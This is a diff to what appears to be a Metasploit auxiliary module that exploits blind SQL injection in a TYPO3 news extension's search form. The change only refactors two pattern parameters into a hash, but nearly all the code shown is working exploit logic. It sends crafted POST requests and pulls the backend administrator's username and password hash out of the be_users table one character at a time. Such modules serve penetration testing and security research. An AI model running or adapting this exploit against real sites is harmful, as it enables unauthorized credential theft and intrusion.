@@ -61,20 +61,19 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def dump_the_hash(pattern1, pattern2)
+  def dump_the_hash(patterns = {})
     ascii_charset_lower = "a".upto("z").to_a.join('')
     ascii_charset_upper = "A".upto("Z").to_a.join('')
     ascii_charset = "#{ascii_charset_lower}#{ascii_charset_upper}"
     digit_charset = "0".upto("9").to_a.join('')
-
     full_charset = "#{ascii_charset_lower}#{ascii_charset_upper}#{digit_charset}$./"
-    username = blind('username','be_users', 'uid=1', ascii_charset, digit_charset, pattern1, pattern2)
+    username = blind('username','be_users', 'uid=1', ascii_charset, digit_charset, patterns)
     print_good("Username: #{username}")
-    password = blind('password','be_users', 'uid=1', full_charset, digit_charset, pattern1, pattern2)
+    password = blind('password','be_users', 'uid=1', full_charset, digit_charset, patterns)
     print_good("Password Hash: #{password}")
   end
 
-  def blind(field, table, condition, charset, digit_charset, pattern1, pattern2)
+  def blind(field, table, condition, charset, digit_charset, patterns = {})
     # Adding 9 so that the result has two digits, If the lenght is superior to 100-9 it won't work
     offset = 9
     size = blind_size(
@@ -83,7 +82,7 @@ class MetasploitModule < Msf::Auxiliary
      condition,
      2,
      digit_charset,
-     pattern1, pattern2
+     patterns
     )
     size = size.to_i - offset
     data = blind_size(
@@ -92,7 +91,7 @@ class MetasploitModule < Msf::Auxiliary
      condition,
      size,
      charset,
-     pattern1, pattern2
+     patterns
     )
     return data
   end
@@ -104,13 +103,13 @@ class MetasploitModule < Msf::Auxiliary
     return payload3
   end
 
-  def blind_size(field, table, condition, size, charset,  pattern1, pattern2)
+  def blind_size(field, table, condition, size, charset,  patterns = {})
     str = ""
     for position in 0..size
       for char in charset.split('')
         payload = select_position(field, table, condition, position + 1, char)
         #print_status(payload)
-        if test(payload, pattern1, pattern2)
+        if test(payload, patterns)
           str += char.to_s
           #print_status(str)
           break
@@ -120,7 +119,7 @@ class MetasploitModule < Msf::Auxiliary
     return str
   end
 
-  def test(payload, pattern1, pattern2)
+  def test(payload, patterns = {})
     res = send_request_cgi({
       'method'   => 'POST',
       'uri'      => normalize_uri(target_uri.path,'index.php'),
@@ -136,7 +135,7 @@ class MetasploitModule < Msf::Auxiliary
          'tx_news_pi1[search][minimumDate]' => '' # Not required
        }
     })
-    return res.body.index(pattern1) < res.body.index(pattern2)
+    return res.body.index(patterns[:pattern1]) < res.body.index(patterns[:pattern2])
   end
 
   def try_autodetect_patterns()
@@ -171,7 +170,7 @@ class MetasploitModule < Msf::Auxiliary
       print_error("Impossible to determine pattern automatically, aborting...")
     else
       print_status("Dumping the username and password hash...")
-      dump_the_hash(pattern1, pattern2)
+      dump_the_hash(:pattern1 => pattern1, :pattern2 => pattern2)
     end
   end
 end
